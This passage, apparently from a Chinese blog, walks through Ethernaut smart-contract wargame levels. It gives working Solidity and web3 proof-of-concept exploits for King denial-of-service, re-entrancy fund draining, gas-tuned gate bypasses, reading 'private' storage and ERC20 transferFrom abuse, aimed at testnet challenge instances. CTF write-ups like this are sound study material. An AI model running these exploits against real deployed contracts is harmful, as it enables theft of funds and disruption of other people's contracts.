</ul>
<h2 id="King"><a href="#King" class="headerlink" title="King"></a>King</h2><p>通关条件：</p>
<ul>
<li>发送比当前奖金还大的ether成为King</li>
<li>提交实例后，保证King的身份不被收回</li>
</ul>
<p>​    第一个条件：成为king</p>
<p>​    我们可以通过向合约发送1.1 ether 来获取King的位置</p>
<p>​    第二个条件：保证位置不被收回</p>
<p>​    收回King的时候，只要抛出异常，不让合约成功调用fallback函数就可以实现</p>
<p>Poc：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.18;</span><br><span class="line"></span><br><span class="line">contract KingPoc &#123;</span><br><span class="line">    </span><br><span class="line">    function KingPoc() payable &#123;&#125;</span><br><span class="line">    </span><br><span class="line">    address instance_address = 0x63c97a345c05de5f415d0fc5bdfa75bded2c5cfe;</span><br><span class="line">    </span><br><span class="line">    function hack() public &#123;</span><br><span class="line">        instance_address.call.value(1.1 ether)();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function () public &#123;</span><br><span class="line">        revert();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果你以为到这就完了，那你肯定和我一样，吃惊的发现</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">*!@#(*&amp;(@!(#*&amp;(*$&amp;!@#(*&amp;(%@)#$(!@)#(*!@)(#@!(*^#(&amp;()%*)#@(*!@)#(*&amp;    </span><br><span class="line">(╯°□°)--︻╦╤─ - - -  Oops! Looks like you haven&apos;t cracked this level just yet (╯°□°)--︻╦╤─ - - -     </span><br><span class="line">*&amp;@#$(*!@_#)(+!@)_*$(@!$_)&amp;*&amp;%!@#$_)@(#_)@_)#(@(#)&amp;(*$^#*&amp;%^#$)(#@</span><br></pre></td></tr></table></figure>

<p>​    经过一番折腾（大佬的WP），最终发现gas不够！！加加加！闭着眼睛按0，测试网络不缺ether！</p>
<p>​    更多Out of gas的相关信息，看大佬的文章：<a href="https://www.jianshu.com/p/56aa08444b33" target="_blank" rel="noopener">[solidity合约审计 - Out of gas的处理办法]</a></p>
<p>关键：</p>
<ul>
<li>out of gas问题</li>
<li>revert()的使用</li>
</ul>
<h2 id="Re-entrancy"><a href="#Re-entrancy" class="headerlink" title="Re-entrancy"></a>Re-entrancy</h2><p>通关条件：</p>
<ul>
<li>获取合约中所有资金</li>
</ul>
<p>​    这关的漏洞有个很大的事件——THE DAO黑客事件，可以在搜索引擎上了解了解，这次事件导致了以太坊的分叉——一次充满争议的决策。</p>
<p>Poc:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.18;</span><br><span class="line"></span><br><span class="line">contract Reentrance &#123;</span><br><span class="line"></span><br><span class="line">  mapping(address =&gt; uint) public balances;</span><br><span class="line"></span><br><span class="line">  function donate(address _to) public payable;</span><br><span class="line">  function balanceOf(address _who) public view returns (uint balance);</span><br><span class="line">  function withdraw(uint _amount) public;</span><br><span class="line">  function() public payable &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract ReentrancePoc &#123;</span><br><span class="line"></span><br><span class="line">    Reentrance reInstance;</span><br><span class="line">    </span><br><span class="line">    function getEther() public &#123;</span><br><span class="line">        msg.sender.transfer(address(this).balance);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function ReentrancePoc(address _addr) public&#123;</span><br><span class="line">        reInstance = Reentrance(_addr);</span><br><span class="line">    &#125;</span><br><span class="line">    function callDonate() public payable&#123;</span><br><span class="line">        reInstance.donate.value(msg.value)(this);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack() public &#123;</span><br><span class="line">        reInstance.withdraw(1 ether);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  function() public payable &#123;</span><br><span class="line">      if(address(reInstance).balance &gt;= 1 ether)&#123;</span><br><span class="line">        reInstance.withdraw(1 ether);</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​    在这一关中，存在问题的主要重入攻击，通过构造一个恶意合约，在恶意合约的fallback函数中在次调用withdraw函数，反复执行取钱操作，知道题目合约余额为0。</p>
<p>​    在上面的Poc中，我们先使用callDonate存入一笔资金以满足调用withdraw的条件，这里需要注意的是在Remix中调用callDonate之前需要修改value为1 ether。</p>
<p><img src="/2019/11/09/Ethernaut%20WriteUp/img7.png" alt="img7"></p>
<p>​    就是这里卡了我很久，因为对Remix使用的不熟悉，起初以为只有在部署合约的时候才会修改value的值，没有想过在函数调用的时候也需要用到。</p>
<p>​    除了这个问题，还有一个很大的问题，就是 OOG问题 ，即Out of gas。 在本地测试不会遇到。这是因为默认的Gas设置不能满足重入的需求，可以手动修改gas的量。 </p>
<p><img src="/2019/11/09/Ethernaut%20WriteUp/img8.png" alt="img8"></p>
<p>大佬还注意到了一个额外的问题：</p>
<blockquote>
<p> 顺便一提，本体其实还有整数下溢的问题。 </p>
</blockquote>
<p> <code>await getBalance(contract.address)</code>查看合约总余额。为0，则代表通关。 </p>
<p>关键：</p>
<ul>
<li>out of gas 问题</li>
<li>Remix的使用</li>
<li>THE DAO事件</li>
<li>重入漏洞</li>
</ul>
<h2 id="Elevator"><a href="#Elevator" class="headerlink" title="Elevator"></a>Elevator</h2><p>通关条件：</p>
<ul>
<li>到达电梯顶部</li>
</ul>
<p>Poc:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.18;</span><br><span class="line"></span><br><span class="line">contract Elevator &#123;</span><br><span class="line">  bool public top;</span><br><span class="line">  uint public floor;</span><br><span class="line"></span><br><span class="line">  function goTo(uint _floor) public;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract BuildingPoc &#123;</span><br><span class="line"></span><br><span class="line">    Elevator ele;</span><br><span class="line">    bool t = true;</span><br><span class="line"></span><br><span class="line">    function isLastFloor(uint) view public returns (bool)&#123;</span><br><span class="line">        t = !t;</span><br><span class="line">        return t;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function attack(address _addr) public&#123;</span><br><span class="line">        ele = Elevator(_addr);</span><br><span class="line">        ele.goTo(5);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​    简单分析一下：</p>
<p>​    题目中给出了一个接口Building，其中有一个isLastFloor函数，而合约Elevator中我们能调用的只有goTo函数。bool类型的top变量代表了是否到达顶层，要通过我们就需要将top赋予true，而在goTo函数中，top = building.isLastFloor(floor)，我们只要能将isLastFloor的返回值变为true即可通关。isLastFloor总共有两次返回值，只要第一次返回false，第二次返回true即可。</p>
<p>​    通过以后，题目给出了另一个解决办法：构建一个视图函数。例如 gasleft()</p>
<p>​    暂时还没想到该怎么利用，待更新··· ···</p>
<p>关键：</p>
<ul>
<li>函数即使被修饰了pure、view等修饰符，虽然会有警告，但还是可以修改状态变量的。 </li>
</ul>
<h2 id="Privacy"><a href="#Privacy" class="headerlink" title="Privacy"></a>Privacy</h2><p>通关条件：</p>
<ul>
<li>解锁合约</li>
</ul>
<p>第一种方式是大佬的：</p>
<p>​    直接使用web3 api的 web3.eth.getStorageAt</p>
<p>Poc：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">web3.eth.getStorageAt(<span class="string">"0x605d336f17fc3a2e50e3f290977525a0f6a5fcc0"</span>, <span class="number">0</span>,<span class="function"><span class="keyword">function</span>(<span class="params">x,y</span>)</span>&#123;<span class="built_in">console</span>.info(y);&#125;)</span><br><span class="line"><span class="number">0x000000000000000000000000000000000000000000000000000000d80cff0a01</span></span><br><span class="line">web3.eth.getStorageAt(<span class="string">"0x605d336f17fc3a2e50e3f290977525a0f6a5fcc0"</span>, <span class="number">1</span>,<span class="function"><span class="keyword">function</span>(<span class="params">x,y</span>)</span>&#123;<span class="built_in">console</span>.info(y);&#125;)</span><br><span class="line"><span class="number">0x47dac1a874d4d1f852075da0347307d6fcfef2a6ca6804ffda7b54e02df5c359</span></span><br><span class="line">web3.eth.getStorageAt(<span class="string">"0x605d336f17fc3a2e50e3f290977525a0f6a5fcc0"</span>, <span class="number">2</span>,<span class="function"><span class="keyword">function</span>(<span class="params">x,y</span>)</span>&#123;<span class="built_in">console</span>.info(y);&#125;)</span><br><span class="line"><span class="number">0x06080b7822355f604ab68183a2f2a88e2b5be84a34e590605503cf17aec66668</span></span><br><span class="line">web3.eth.getStorageAt(<span class="string">"0x605d336f17fc3a2e50e3f290977525a0f6a5fcc0"</span>, <span class="number">3</span>,<span class="function"><span class="keyword">function</span>(<span class="params">x,y</span>)</span>&#123;<span class="built_in">console</span>.info(y);&#125;)</span><br><span class="line"><span class="number">0xd42c0162aa0829887dbd2741259c97ca54fb1a26da7098de6a3697d6c4663b93</span></span><br><span class="line">web3.eth.getStorageAt(<span class="string">"0x605d336f17fc3a2e50e3f290977525a0f6a5fcc0"</span>, <span class="number">4</span>,<span class="function"><span class="keyword">function</span>(<span class="params">x,y</span>)</span>&#123;<span class="built_in">console</span>.info(y);&#125;)</span><br><span class="line"><span class="number">0x0000000000000000000000000000000000000000000000000000000000000000</span></span><br></pre></td></tr></table></figure>

<p>大佬的分析：</p>
<blockquote>
<p>根据 solidity 文档中的变量存储原则，evm 每一次处理 32 个字节，而不足 32 字节的变量相互共享并补齐 32 字节。<br>那么我们简单分析下题目中的变量们：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">bool public locked = <span class="literal">true</span>;  <span class="comment">//1 字节 01</span></span><br><span class="line">uint256 public constant ID = block.timestamp; <span class="comment">//32 字节</span></span><br><span class="line">uint8 private flattening = <span class="number">10</span>; <span class="comment">//1 字节 0a</span></span><br><span class="line">uint8 private denomination = <span class="number">255</span>;<span class="comment">//1 字节 ff</span></span><br><span class="line">uint16 private awkwardness = uint16(now);<span class="comment">//2 字节</span></span><br><span class="line"></span><br><span class="line">bytes32[<span class="number">3</span>] private data;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>那么第一个 32 字节就是由<code>locked</code>、<code>flattening</code>、<code>denomination</code>、<code>awkwardness</code>组成，另外由于常量是无需存储的，所以从第二个 32 字节起就是 data。<br>那么 data[2] 就是<code>0xd42c0162aa0829887dbd2741259c97ca54fb1a26da7098de6a3697d6c4663b93</code>，<br>注意这里进行了强制类型转换将 data[2] 转换成了 bytes16，那么我们取前 16 字节即可。<br>执行 unlock 即可。</p>
</blockquote>
<p>执行：contract.unlock(‘0xd42c0162aa0829887dbd2741259c97ca’)</p>
<p>over!</p>
<p><a href="https://www.anquanke.com/post/id/148341#h2-12" target="_blank" rel="noopener">Zeppelin Ethernaut writeup</a></p>
<p>上面那篇文章使用的是contract.unlock(web3.toAscii(‘0xd42c0162aa0829887dbd2741259c97ca’))，不知道为什么会出现 ”ALERT: 交易出错. 合约代码执行异常. “错误，看啥时候能解决这个问题吧。</p>
<p>关键：</p>
<ul>
<li>使用web3.getStorageAt读取指定地址数据</li>
<li>evm每次处理32字节</li>
<li>根据 Solidity 优化规则，当变量所占空间小于 32 字节时，会与后面的变量共享空间，如果加上后面的变量也不超过 32 字节的话。 </li>
<li>常量无需存储 </li>
<li>使用了slice切割字符</li>
</ul>
<h2 id="Gatekeeper-One"><a href="#Gatekeeper-One" class="headerlink" title="Gatekeeper One"></a>Gatekeeper One</h2><p>通关条件：</p>
<ul>
<li>满足gateOne、gateTwo、gateThree的所有条件42</li>
</ul>
<p>​    gateOne只要满足msg.sender != tx.origin即可，相信通过前面的关卡这时小菜一碟，只需要创建一个新合约，在合约内部再去调用题目合约即可。</p>
<p>​    gateTwo折磨了我很久很久，总是过不了，看了大佬的POC和分析还是过不了，最后才发现是自己的理解能力不够（太菜了）。gateTwo只要满足进行mod运算时的gas是8191的整数倍即可。</p>
<p>​    在Remix中可以利用debug功能来确定gas应该传入多少，如下图所示，现在本地测试网络进行测试：</p>
<p><img src="/2019/11/09/Ethernaut%20WriteUp/img1.png" alt="img1"></p>
<p>​    然后调用attack进行debug：</p>
<p><img src="/2019/11/09/Ethernaut%20WriteUp/img2.png" alt="img2"></p>
<p>​    在很多大佬的writeUp中所讲的走到DUP2这里， remaining gas应该是8191的整数倍。我开始也是这样的做的，但是这样计算出来的gas就和大佬们的不一样，在本地测试网络中能够跑通，在题目环境中就没办法跑通，这个困扰了我很长一段时间。后来才知道能够在Etherscan上查看每一步的gas消耗，如下图所示：</p>
<p>查看地址： <a href="https://ropsten.etherscan.io/vmtrace?txhash=0xff4a3aed71c20cfe9109403040d1e7f4cd9d77d62dc8cd3205066c3ca5e565c0" target="_blank" rel="noopener">https://ropsten.etherscan.io/vmtrace?txhash=0xff4a3aed71c20cfe9109403040d1e7f4cd9d77d62dc8cd3205066c3ca5e565c0</a> （将txhash后的交易hash改为自己的即可）</p>
<p><img src="/2019/11/09/Ethernaut%20WriteUp/img3.png" alt="img3"></p>
<p>​    在查看了gas消耗情况之后发现，本地显示的gas和这里显示的有所区别，本地能够跑通的在这里会无法满足，在走到DUP2这一步时不是8191的整数倍。而满足了这里的整数倍的数据，在本地发现跑不通了，这个问题暂时不知道是什么情况，目前了解还是太少了，等日后有能力再来解决吧。</p>
<p>​    接下来是gateThree，gateThree有三个条件：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">uint32(_gateKey) == uint16(_gateKey)</span><br><span class="line">uint32(_gateKey) != uint64(_gateKey)</span><br><span class="line">uint32(_gateKey) == uint16(tx.origin)</span><br></pre></td></tr></table></figure>

<p>​    无符号整型可以转换成跟它大小相等或更大的字节类型，但反之不能 。</p>
<p>​    要满足第三个条件只需要_gatekey的前4字节全为0，后4字节为tx.origin的最后4字节，拿我的地址 0x2eb4081c419d1890eb0Af97ce5A9689Cad2fe3da 为例，构造一个0x0000e3da即可，这样可以发现同时满足了第一个条件。</p>
<p>​    还剩第二个条件，uint32(_gatekey)在与uint64进行比较时会由0x0000e3da转换为0x000000000000e3da,要使二者不相等只要gatekey的前半部分不为全0即可，我构造的是：0xFFFFFFFF0000733c（最后四个字节必须改为自己地址的最后4位)。</p>
<p>​    于是最终的Poc：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.18;</span><br><span class="line"></span><br><span class="line">contract GatekeeperOne &#123;</span><br><span class="line"></span><br><span class="line">  address public entrant;</span><br><span class="line"></span><br><span class="line">  modifier gateOne() &#123;</span><br><span class="line">    require(msg.sender != tx.origin);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier gateTwo() &#123;</span><br><span class="line">    require(msg.gas % 8191 == 0);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier gateThree(bytes8 _gateKey) &#123;</span><br><span class="line">    require(uint32(_gateKey) == uint16(_gateKey));</span><br><span class="line">    require(uint32(_gateKey) != uint64(_gateKey));</span><br><span class="line">    require(uint32(_gateKey) == uint16(tx.origin));</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) &#123;</span><br><span class="line">    entrant = tx.origin;</span><br><span class="line">    return true;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract GatekeeperOnePoc &#123;</span><br><span class="line">    </span><br><span class="line">    GatekeeperOne one;</span><br><span class="line">    </span><br><span class="line">    function GatekeeperOnePoc(address _addr) public&#123;</span><br><span class="line">        one = GatekeeperOne(_addr);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function attack() public&#123;</span><br><span class="line">        one.call.gas(819315)(bytes4(keccak256(&quot;enter(bytes8)&quot;)), bytes8(0xFFFFFFFF0000733c));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​    我们可以通过await contract.entrant()来查看是否完成了通关条件，如果完成，返回值应该是你自己的地址。</p>
<p>关键：</p>
<ul>
<li>debug的使用</li>
<li>etherscan gas消耗详情的查看</li>
<li>uint比较的方式</li>
<li>call对gas的控制以及函数的调用</li>
</ul>
<h2 id="Gatekeeper-Two"><a href="#Gatekeeper-Two" class="headerlink" title="Gatekeeper Two"></a>Gatekeeper Two</h2><p>通关条件：</p>
<ul>
<li>与上关差不多，也是满足 modeifier的几个条件即可</li>
</ul>
<p>​    gateOne没啥可说的，依旧是合约调用合约即可。</p>
<p>​    gateTwo直接引用大佬的分析吧。</p>
<blockquote>
<p>gateTwo 中 extcodesize 用来获取指定地址的合约代码大小。这里使用的是内联汇编，来获取调用方(caller)的代码大小，一般来说，caller 为合约时，获取的大小为合约字节码大小，caller 为账户时，获取的大小为 0 。</p>
<p>条件为调用方代码大小为 0 ，但这又与 gateOne 冲突了。经过研究发现，当合约在初始化，还未完全创建时，代码大小是可以为0的。因此，我们需要把攻击合约的调用操作写在 <code>constructor</code> 构造函数中。</p>
</blockquote>
<p>Poc：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.18;</span><br><span class="line"></span><br><span class="line">contract GatekeeperTwo &#123;</span><br><span class="line"></span><br><span class="line">  address public entrant;</span><br><span class="line"></span><br><span class="line">  modifier gateOne() &#123;</span><br><span class="line">    require(msg.sender != tx.origin);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier gateTwo() &#123;</span><br><span class="line">    uint x;</span><br><span class="line">    assembly &#123; x := extcodesize(caller) &#125;</span><br><span class="line">    require(x == 0);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier gateThree(bytes8 _gateKey) &#123;</span><br><span class="line">    require(uint64(keccak256(msg.sender)) ^ uint64(_gateKey) == uint64(0) - 1);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) &#123;</span><br><span class="line">    entrant = tx.origin;</span><br><span class="line">    return true;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract GatekeeperTwoPoc &#123;</span><br><span class="line">    </span><br><span class="line">     uint64 public mask = 0xFFFFFFFFFFFFFFFF;</span><br><span class="line">    </span><br><span class="line">    function GatekeeperTwoPoc(address _addr)&#123;</span><br><span class="line">        GatekeeperTwo target = GatekeeperTwo(_addr);</span><br><span class="line">        uint64 res =  uint64(keccak256(this)) ^ mask;</span><br><span class="line">        target.enter(bytes8(res));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>关键：</p>
<ul>
<li>extcidesize获取指定地址合约代码大小<ul>
<li>地址为合约时，获取大小为合约字节码大小</li>
<li>地址为账户时，获取的大小为0</li>
</ul>
</li>
<li>当合约在初始化，还未完全创建时，代码大小是可以为0的 </li>
<li>异或两次后得到的数据是原数据</li>
</ul>
<h2 id="Naught-Coin"><a href="#Naught-Coin" class="headerlink" title="Naught Coin"></a>Naught Coin</h2><p>通关条件：</p>
<ul>
<li>使token变为0</li>
</ul>
<p>​    首先我们需要知道什么是<a href="https://eips.ethereum.org/EIPS/eip-20" target="_blank" rel="noopener">ERC20</a>,然后，直接看大佬的分析吧！</p>
<blockquote>
<p>既然子合约没有什么问题，那我们看看 import 的父合约<br><a href="https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Faragon%2Fzeppelin-solidity%2Fblob%2Fmaster%2Fcontracts%2Ftoken%2FStandardToken.sol" target="_blank" rel="noopener">StandardToken.sol</a>，其其实根据 ERC20 的标准我们也知道，转账有两个函数，一个<code>transfer</code>一个<code>transferFrom</code>，题目中代码只重写了<code>transfer</code>函数，那未重写<code>transferFrom</code>就是一个可利用的点了。直接看看<code>StandardToken.sol</code>代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">contract StandardToken &#123;</span><br><span class="line"> using ERC20Lib for ERC20Lib.TokenStorage;</span><br><span class="line"> ERC20Lib.TokenStorage token;</span><br><span class="line"> ...</span><br><span class="line"> function transfer(address to, uint value) returns (bool ok) &#123;</span><br><span class="line">      return token.transfer(to, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"> function transferFrom(address from, address to, uint value) returns (bool ok) &#123;</span><br><span class="line">      return token.transferFrom(from, to, value);</span><br><span class="line">    &#125;</span><br><span class="line"> ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>跟进<code>ERC20Lib.sol</code>： </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">library ERC20Lib &#123;</span><br><span class="line"> ...</span><br><span class="line"> function transfer(TokenStorage storage self, address _to, uint _value) returns (bool success) &#123;</span><br><span class="line">     self.balances[msg.sender] = self.balances[msg.sender].minus(_value);</span><br><span class="line">     self.balances[_to] = self.balances[_to].plus(_value);</span><br><span class="line">     Transfer(msg.sender, _to, _value);</span><br><span class="line">     return true;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> function transferFrom(TokenStorage storage self, address _from, address _to, uint _value) returns (bool success) &#123;</span><br><span class="line">     var _allowance = self.allowed[_from](msg.sender);</span><br><span class="line"></span><br><span class="line">     self.balances[_to] = self.balances[_to].plus(_value);</span><br><span class="line">     self.balances[_from] = self.balances[_from].minus(_value);</span><br><span class="line">     self.allowed[_from](msg.sender) = _allowance.minus(_value);</span><br><span class="line">     Transfer(_from, _to, _value);</span><br><span class="line">     return true;</span><br><span class="line"> &#125;</span><br><span class="line"> ...</span><br><span class="line"> function approve(TokenStorage storage self, address _spender, uint _value) returns (bool success) &#123;</span><br><span class="line">     self.allowed[msg.sender](_spender) = _value;</span><br><span class="line">     Approval(msg.sender, _spender, _value);</span><br><span class="line">     return true;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>可以直接调用这个<code>transferFrom</code>即可了。但是<code>transferFrom</code>有一步权限验证，要验证这个<code>msg.sender</code>是否被<code>_from</code>（实际上在这里的情景的就是自己是否给自己授权了），那么我们同时还可以调用 approve 给自己授权。</p>
<p>Poc:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">await contract.approve(player,toWei(1000000))</span><br><span class="line">await contract.transferFrom(player,contract.address,toWei(1000000))</span><br><span class="line"></span><br></pre></td></tr></table></figure>
</blockquote>
<p>关键：</p>
<ul>
<li>ERC20的转账操作函数</li>
</ul>
<h2 id="Preservation"><a href="#Preservation" class="headerlink" title="Preservation"></a>Preservation</h2><p>通关条件：</p>
<ul>
<li>获得合约所有权</li>
</ul>
<blockquote>
<p>delegatecall：进行函数调用时代码是在调用函数的环境里执行</p>
<p>call：call调用其他合约的函数时，代码是在被调用的合约的环境里执行的</p>
</blockquote>
<p>for example：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.18;</span><br><span class="line"></span><br><span class="line">contract a &#123;</span><br><span class="line">    uint a1;</span><br><span class="line">    </span><br><span class="line">    function a0(address test) public &#123;</span><br><span class="line">        test.delegatecall(bytes4(keccak256(&quot;b0()&quot;)));</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function getA1() returns(uint) &#123;</span><br><span class="line">        return a1;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract b &#123;</span><br><span class="line">    uint b1; </span><br><span class="line"></span><br><span class="line">    function b0() public &#123;</span><br><span class="line">        b1 = 1111;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function getB1() public returns(uint) &#123;</span><br><span class="line">        return b1;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

